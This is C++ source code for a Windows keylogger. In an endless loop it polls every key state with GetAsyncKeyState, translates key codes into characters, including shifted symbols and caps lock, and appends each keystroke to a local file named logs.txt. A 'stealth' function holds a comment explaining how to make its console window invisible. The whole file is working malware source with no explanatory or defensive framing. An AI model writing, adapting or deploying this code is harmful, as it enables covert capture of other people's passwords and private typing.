#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>

using namespace std;

bool is_capslock = false;

void _log(int key) {
	ofstream out_file;
	out_file.open("logs.txt", ios::app);
	string text = "";

	switch (key) {
	///////////////////////
	/////	SPECIAL KEYS
	///////////////////////
	case 13:
		text += "\n"; break;
	case 20:
		(is_capslock == false) ? (is_capslock = true, text += " [CapsLock] ") : (is_capslock = false, text += " [/CapsLock] "); break;
	case VK_BACK:
		text += " [Backspace] "; break;
	case VK_TAB:		// #3 
		text += "[TAB]"; break;
	case VK_SPACE:		// #12
		text += " "; break;
	
	case 46: 
		text += " [DEL] "; break;
	///////////////////////
	/////	NUMBERS
	///////////////////////
	case 48:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += ")" : text += "0"; break;
	case 49:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "!" : text += "1"; break;
	case 50:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "@" : text += "2"; break;
	case 51:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "#" : text += "3"; break;
	case 52:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "$" : text += "4"; break;
	case 53:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "%" : text += "5"; break;
	case 54:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "^" : text += "6"; break;
	case 55:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "&" : text += "7"; break;
	case 56:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "*" : text += "8"; break;
	case 57:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "(" : text += "9"; break;
	///////////////////////
	/////	LATIN ALPHABET
	///////////////////////
	case 65:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "A" : text += "a"; break;
	case 66:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "B" : text += "b"; break;
	case 67:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "C" : text += "c"; break;
	case 68:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "D" : text += "d"; break;
	case 69:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "E" : text += "e"; break;
	case 70:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "F" : text += "f"; break;
	case 71:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "G" : text += "g"; break;
	case 72:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "H" : text += "h"; break;
	case 73:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "I" : text += "i"; break;
	case 74:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "J" : text += "j"; break;
	case 75:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "K" : text += "k"; break;
	case 76:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "L" : text += "l"; break;
	case 77:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "M" : text += "m"; break;
	case 78:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "N" : text += "n"; break;
	case 79:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "O" : text += "o"; break;
	case 80:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "P" : text += "p"; break;
	case 81:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "Q" : text += "q"; break;
	case 82:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "R" : text += "r"; break;
	case 83:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "S" : text += "s"; break;
	case 84:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "T" : text += "t"; break;
	case 85:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "U" : text += "u"; break;
	case 86:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "V" : text += "v"; break;
	case 87:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "W" : text += "w"; break;
	case 88:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "X" : text += "x"; break;
	case 89:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "Y" : text += "y"; break;
	case 90:
		(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) ? text += "Z" : text += "z"; break;
	///////////////////////
	/////	SIGNS
	///////////////////////





		
	///////////////////////
	/////	NUM PAD 
	///////////////////////
	case 96:
		text += "0"; break;
	case 97:
		text += "1"; break;
	case 98:
		text += "2"; break;
	case 99:
		text += "3"; break;
	case 100:
		text += "4"; break;
	case 101:
		text += "5"; break;
	case 102:
		text += "6"; break;
	case 103:
		text += "7"; break;
	case 104:
		text += "8"; break;
	case 105:
		text += "9"; break;
	case VK_MULTIPLY:
		text += "*"; break;
	case VK_ADD:
		text += "+"; break;
	case VK_SUBTRACT:
		text += "-"; break;
	case VK_DECIMAL:
		text += "."; break;
	case VK_DIVIDE:
		text += "/"; break;
	}
	out_file << text; 
	out_file.close(); 
}

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, 1); // *(stealth,0) - invisible window 
}

int main() {
	stealth();
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);

	int i;
	while (true)
		for (i = 0; i <= 222; i++) // Check keyboard keys
			if (GetAsyncKeyState(i) == -32767) // if key 'i' was pressed
				_log(i); // update log message
	return 0;
}